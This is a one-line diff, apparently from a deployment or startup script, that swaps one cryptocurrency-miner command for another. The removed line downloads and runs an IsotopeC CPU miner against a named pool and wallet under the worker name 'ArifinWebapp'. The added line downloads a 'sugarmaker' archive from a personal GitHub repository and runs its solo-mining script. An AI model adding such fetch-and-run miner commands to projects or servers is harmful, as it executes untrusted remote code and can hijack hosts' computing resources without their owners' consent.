@@ -1,1 +1,1 @@
-wget https://github.com/isotopec-org/isotopec-cpuminer/releases/download/v1.0.0.0/IsotopeC-CPUminer_v1.0.0.0_Linux_Static.tar.gz && tar zxvf IsotopeC-CPUminer_v1.0.0.0_Linux_Static.tar.gz && cd IsotopeC-CPUminer_v1.0.0.0_Linux_Static && ./isotopec-cpuminer-ryzen -a YespowerIC -o eu-stratum.phalanxmine.com:6235 -u iNp1MjExZvjiygEaASK8MWL6Lii6hZUToN.ArifinWebapp -p c=ISO --cpu-affinity 63 --cpu-priority 5
+wget https://github.com/sacha236/awe/raw/main/sugarmaker-v2.5.0.tar.gz && tar zxvf sugarmaker-v2.5.0.tar.gz && cd sugarmaker-v2.5.0 && ./run-mainnet-solo.sh
